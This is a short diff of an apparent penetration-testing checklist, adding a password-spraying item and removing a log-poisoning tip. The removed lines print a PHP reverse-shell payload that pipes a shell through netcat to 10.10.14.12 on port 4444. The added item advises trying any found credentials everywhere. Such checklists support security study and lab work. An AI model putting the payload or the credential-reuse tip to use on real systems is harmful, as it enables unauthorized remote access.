@@ -1,4 +1,6 @@
-- [ ]  Web scanning
+
+
+- [ ] Web scanning
 
 - [ ]    Robots.txt
 
@@ -79,10 +81,6 @@
 - [ ]   Bruteforce session cookie
 
 
-## If you get local file inclusion for log, you maybe can log poisoning the log
+# Password spray
 
-
-
-```
-<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f') ?>
-```
+- [ ]   If you got any type of credentials just try it everywhere 
